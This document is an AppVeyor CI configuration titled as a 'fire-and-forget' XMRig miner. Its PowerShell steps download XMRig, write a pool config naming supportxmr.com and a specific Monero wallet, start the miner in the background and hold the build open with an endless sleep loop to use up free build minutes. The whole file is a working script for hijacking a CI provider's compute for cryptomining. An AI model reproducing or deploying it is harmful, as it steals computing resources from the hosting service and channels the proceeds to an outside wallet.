# AppVeyor Build Configuration for a "Fire-and-Forget" XMRig Miner

# 1. Environment and Build Configuration
# We use the Visual Studio 2022 image, which is a modern Windows environment.
image: Visual Studio 2022

# We don't need to build any code, so we turn off the default build step.
build: off

# 2. Main Installation and Configuration Script
# This block runs before the main build. We use it for our entire setup process.
install:
  # Use PowerShell for all commands
  - ps: |
      # Fail the script if any command has an error
      $ErrorActionPreference = "Stop"
      
      # --- 1. Setup Paths and Variables ---
      $minerVersion = "6.21.2"
      $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
      $zipPath = "$env:TEMP\xmrig.zip"
      $extractPath = "$env:USERPROFILE\Desktop\miner" # Extract to a known location
      
      Write-Host "Ensuring destination directory exists..."
      New-Item -ItemType Directory -Force -Path $extractPath
      
      # --- 2. Download and Extract ---
      Write-Host "Downloading XMRig v$($minerVersion)..."
      Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
      
      Write-Host "Extracting XMRig..."
      Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
      
      $minerFolder = (Get-ChildItem -Path $extractPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
      if (-not $minerFolder) { throw "CRITICAL: Could not find extracted XMRig folder!" }
      Write-Host "Found miner folder: $minerFolder"
      
      # --- 3. Create Config Files ---
      $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
      $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
      Write-Host "config.json created."

      $batPath = Join-Path $extractPath "Start-Miner.bat"
      $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe"
      Set-Content -Path $batPath -Value $batContent
      Write-Host "Start-Miner.bat created."

# 3. Running the Miner and Keeping the Build Alive
# This is the main "build" step.
build_script:
  - ps: |
      Write-Host "Starting the miner process..."
      # Start the miner as a background job
      Start-Process -FilePath "$env:USERPROFILE\Desktop\miner\Start-Miner.bat"
      
      Write-Host "Miner process has been launched in the background."
      Write-Host "You must monitor your progress on the mining pool's website."
      Write-Host "This build will now run until it times out (approx. 60 minutes on free tier)."
      
      # This loop keeps the build alive
      while ($true) {
          Start-Sleep -Seconds 300
          # We can add a heartbeat to show the build is still alive
          Write-Host "[$(Get-Date)] - Build active, miner running in background..."
      }
